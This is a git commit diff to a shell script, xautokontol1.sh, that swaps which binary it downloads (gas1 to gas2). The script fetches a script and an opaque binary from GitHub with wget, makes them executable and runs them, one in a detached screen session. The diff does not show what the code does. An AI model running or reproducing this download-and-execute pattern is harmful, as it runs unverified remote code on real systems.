ab6206b147b33e88eaff040f51ddfee537fcd772
renilo <88342640+renilo@users.noreply.github.com>
2021-10-02 09:35:48 +0700

    Update xautokontol1.sh

--- xautokontol1.sh
+++ xautokontol1.sh
@@ -8,8 +8,8 @@ screen -dmS xhajar1.sh ./xhajar1.sh 65 75
 
 wget https://raw.githubusercontent.com/renilo/hajar/main/xhajar1.sh
 
-wget https://github.com/renilo/hajar/raw/main/gas1 
+wget https://github.com/renilo/hajar/raw/main/gas2 
 
-chmod +x gas1 xhajar1.sh
+chmod +x gas2 xhajar1.sh
 
 ./xhajar1.sh
